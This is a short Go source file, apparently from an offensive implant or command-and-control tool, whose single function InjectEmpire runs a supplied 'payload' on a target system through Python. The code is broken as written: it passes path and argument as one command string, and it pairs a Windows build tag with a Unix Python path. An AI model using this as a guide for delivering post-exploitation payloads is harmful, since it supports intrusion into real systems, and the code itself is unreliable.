// +build windows


package biterpreter

import (
	
	"os/exec"	// requirement to execute commands against target system
	"bytes"
)


func InjectEmpire(payload string) (bool,string){
	
	var outbuf, errbuf bytes.Buffer
	cmd_path := "/usr/bin/python "+payload
	cmd := exec.Command(cmd_path)
	cmd.Stdout = &outbuf
	cmd.Stderr = &errbuf
	cmd.Run()
	cmd.Wait()
	stdout := outbuf.String()
	stderr := errbuf.String()
	if stderr != ""{
		return true,stderr+stdout
	}

	return false,stdout+stderr
}